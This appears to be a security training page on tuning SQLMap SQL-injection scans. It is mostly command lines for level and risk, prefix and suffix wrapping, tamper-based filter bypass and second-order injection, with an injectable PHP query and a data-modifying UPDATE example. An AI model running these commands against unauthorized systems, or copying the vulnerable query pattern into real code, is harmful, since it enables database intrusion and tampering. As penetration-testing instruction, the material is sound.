---
title: 'Attack Tuning'
description: 'Fine-tune SQLMap scans with level, risk, technique selection, prefix/suffix customization, UNION column configuration, and second-order injection.'
icon: material/tune-vertical
tags:
  - sqlmap
  - attack-tuning
  - sql-injection
---

# Attack Tuning

The default SQLMap settings are conservative — designed to be fast and avoid false positives. But in real engagements, you'll often need to **tune** the attack to handle complex scenarios. This section teaches you every knob and dial available.

---

## Level and Risk — The Two Master Controls

These are the most important tuning parameters. Think of them as:

- **Level** = How **broad** is the testing? (How many parameters and payload patterns?)
- **Risk** = How **aggressive** is the testing? (Will it modify data?)

### `--level` (1–5)

Controls the **number of payloads** used and **which parameters** are tested:

| Level | Parameters Tested | Payload Count | Time Estimate |
|---|---|---|---|
| **1** (default) | GET + POST body only | ~100 payloads per param | 1–5 minutes |
| **2** | + Cookie values | ~200 payloads per param | 5–10 minutes |
| **3** | + User-Agent, Referer headers | ~500 payloads per param | 10–30 minutes |
| **4** | + Additional header combinations | ~1000 payloads per param | 30–60 minutes |
| **5** | + Host header + all variations | ~5000+ payloads per param | 1–3 hours |

**When to increase level:**

- Level 2: When you suspect injection in a **cookie** value
- Level 3: When you suspect injection in a **header** (User-Agent, Referer)
- Level 5: When you're doing a **thorough security assessment** and want to test everything

```bash title="Test cookies (level 2)"
sqlmap -r request.txt --level=2
```

```bash title="Test headers (level 3)"
sqlmap -r request.txt --level=3
```

### `--risk` (1–3)

Controls the **types of SQL injection** techniques SQLMap will attempt:

| Risk | Techniques Added | Potential Side Effects |
|---|---|---|
| **1** (default) | AND-based, time-based | None — read-only tests |
| **2** | + OR-based tests | May return **all rows** from a table |
| **3** | + UPDATE-based tests | **Can modify data in the database!** |

!!! danger "Risk 3 Warning"

    Risk 3 includes `UPDATE`-based injection tests. This means SQLMap may execute queries like:

    ```sql
    UPDATE users SET email='test' WHERE username='admin' AND (SELECT ...)
    ```

    If the condition fails, the `UPDATE` still runs and **modifies the admin's email**. Only use risk 3 when:

    - You have explicit authorization to modify data
    - You have a database backup
    - You're on a lab/staging environment

```bash title="Moderate testing"
sqlmap -r request.txt --level=3 --risk=2
```

```bash title="Maximum testing (use with caution!)"
sqlmap -r request.txt --level=5 --risk=3
```

---

## Technique Selection (`--technique`)

By default, SQLMap tries all 6 techniques: `BEUSTQ`. You can limit this to speed up scanning or target specific scenarios:

| Letter | Technique | Speed | Use Case |
|---|---|---|---|
| `B` | Boolean-based blind | Medium | Most universal |
| `E` | Error-based | Fast | When errors are visible |
| `U` | UNION query-based | Fastest | When output is displayed |
| `S` | Stacked queries | Variable | When you need DML/DDL |
| `T` | Time-based blind | Slowest | When nothing else works |
| `Q` | Inline queries | Variable | Rare, specific contexts |

### Common Combinations

```bash title="Fast scan — only in-band techniques"
sqlmap -r request.txt --technique=UE
```

```bash title="Blind only — when no output is visible"
sqlmap -r request.txt --technique=BT
```

```bash title="Skip time-based (speed up)"
sqlmap -r request.txt --technique=BEUS
```

```bash title="Stacked queries only — for write operations"
sqlmap -r request.txt --technique=S
```

---

## Custom Prefix and Suffix

Sometimes the injectable parameter is embedded in a SQL context that SQLMap doesn't automatically detect. You can tell SQLMap exactly how to **wrap** its payloads.

### What Are Prefix and Suffix?

Imagine the server-side code looks like this:

```php
$query = "SELECT * FROM products WHERE name LIKE ('%" . $input . "%') ORDER BY id";
```

The injection point is inside `LIKE ('%...%')`. SQLMap needs to:

1. **Close** the existing context: `%')` — this is the **prefix**
2. **Comment out** the rest: `-- -` — this is the **suffix**

```bash
sqlmap -r request.txt \
  --prefix="%')" \
  --suffix="-- -"
```

### Common Prefix/Suffix Patterns

| SQL Context | Prefix | Suffix |
|---|---|---|
| `WHERE col = '$input'` | `'` | `-- -` |
| `WHERE col = "$input"` | `"` | `-- -` |
| `WHERE col = ($input)` | `)` | `-- -` |
| `WHERE col = (('$input'))` | `'))` | `-- -` |
| `WHERE col LIKE '%$input%'` | `%'` | `-- -` |
| `ORDER BY $input` | (none) | `-- -` |
| `LIMIT $input` | (none) | `-- -` |

!!! tip "How to Figure Out the Context"

    If manual testing with `'` produces an error like:

    ```
    You have an error in your SQL syntax; check the manual that corresponds to your MySQL 
    server version for the right syntax to use near '%')' at line 1
    ```

    The error message **tells you** the context! The `%')` at the end reveals the query uses `LIKE ('%...')`. Set your prefix accordingly.

---

## UNION Query Tuning

When SQLMap detects UNION-based injection, it needs to determine the correct number of columns. You can help:

### Specifying Column Count

If you already know the query has 5 columns:

```bash
sqlmap -r request.txt --union-cols=5
```

### Specifying Column Range

If you want SQLMap to test a specific range:

```bash title="Only try 1 to 10 columns"
sqlmap -r request.txt --union-cols=1-10
```

### Specifying the Character Used

By default, SQLMap uses `NULL` for unused columns. Some databases reject `NULL`:

```bash title="Use random strings instead of NULL"
sqlmap -r request.txt --union-char="a"
```

### Specifying FROM Table

Oracle requires a `FROM` clause in every `SELECT`. SQLMap handles this automatically, but you can specify it:

```bash title="Oracle: UNION SELECT ... FROM dual"
sqlmap -r request.txt --union-from="dual"
```

---

## Time-Based Blind Tuning

### Adjusting the Delay Duration

The `--time-sec` flag controls how many seconds SQLMap waits for time-based blind injection:

```bash title="Default (5 seconds)"
sqlmap -r request.txt --time-sec=5
```

```bash title="Faster (for low-latency targets)"
sqlmap -r request.txt --time-sec=2
```

```bash title="Slower (for high-latency targets or unstable networks)"
sqlmap -r request.txt --time-sec=10
```

**How to choose:**

- If your normal response time is <500ms, `--time-sec=2` works
- If your normal response time is 1-2 seconds, use `--time-sec=5` (default)
- If your normal response time is variable (3-5 seconds), use `--time-sec=10`

!!! warning "The Latency Trap"

    If the target server has high latency (e.g., 3 seconds for a normal response), and you set `--time-sec=2`, SQLMap will think **every response** is a delayed response. This leads to completely wrong data extraction. Always set `--time-sec` to be **at least 2x** your normal response time.

---

## Controlling What SQLMap Injects

### Custom Injection Payloads (`--tamper`)

Tamper scripts modify the payload before sending. This is covered in detail in [Bypassing Web Application Protections](bypassing-protections.md), but here are the basics:

```bash title="Use a single tamper script"
sqlmap -r request.txt --tamper=space2comment
```

```bash title="Chain multiple tamper scripts"
sqlmap -r request.txt --tamper=space2comment,between,randomcase
```

### Second-Order Injection

In second-order injection, the payload is **stored** in one location and **executed** in another. For example:

1. You inject `admin'--` as your username during registration
2. The injection triggers when an admin views your profile (different URL)

SQLMap supports this with `--second-url`:

```bash title="Second-Order Injection"
sqlmap -r registration_request.txt \
  --second-url="http://target.com/admin/view_users.php" \
  --batch
```

Or if the result appears in a specific response:

```bash
sqlmap -r request.txt \
  --second-req=second_request.txt
```

---

## Request Rate Control

### Fixed Delay

```bash title="Wait 1 second between each request"
sqlmap -r request.txt --delay=1
```

### Random Delay

```bash title="Random delay between 1 and 3 seconds"
sqlmap -r request.txt --delay=1 --randomize-delay=2
```

### Safe URL (Keep Session Alive)

```bash title="Hit a safe URL every 10 requests"
sqlmap -r request.txt \
  --safe-url="http://target.com/dashboard" \
  --safe-freq=10
```

### Throttle Based on Response

```bash title="Abort if too many timeouts"
sqlmap -r request.txt --timeout=30 --retries=3
```

---

## Page Comparison Tuning

When SQLMap compares TRUE vs FALSE responses, you can help it:

### String Matching

```bash title="This string appears in TRUE responses"
sqlmap -r request.txt --string="Welcome back, admin"
```

```bash title="This string appears in FALSE responses"
sqlmap -r request.txt --not-string="Invalid input"
```

### Regex Matching

```bash title="TRUE responses match this regex"
sqlmap -r request.txt --regexp="user.*admin.*dashboard"
```

### HTTP Status Code Matching

```bash title="TRUE = 200, FALSE = anything else"
sqlmap -r request.txt --code=200
```

### Text-Only Comparison

Strip all HTML tags and compare just the text content:

```bash
sqlmap -r request.txt --text-only
```

### Title-Only Comparison

Compare only the `<title>` tag content:

```bash
sqlmap -r request.txt --titles
```

---

## Putting It All Together: Expert-Level Scan

Here's a command that uses multiple tuning options for a difficult target:

```bash title="Fine-Tuned Scan for a Tough Target"
sqlmap -r request.txt \
  --level=5 \
  --risk=2 \
  --dbms=mysql \
  --technique=BEU \
  --prefix="')" \
  --suffix="-- -" \
  --string="Products found" \
  --tamper=space2comment,between \
  --threads=5 \
  --time-sec=3 \
  --delay=0.5 \
  --batch \
  -v 3
```

This tells SQLMap:

1. Test everything aggressively (`--level=5 --risk=2`)
2. Target MySQL specifically
3. Use Boolean, Error, and UNION techniques only (skip slow ones)
4. The injection context needs `')` prefix and `-- -` suffix
5. TRUE responses contain "Products found"
6. Modify payloads to bypass filters
7. Use 5 threads with 0.5s delay between requests
8. Show all payloads for learning (`-v 3`)
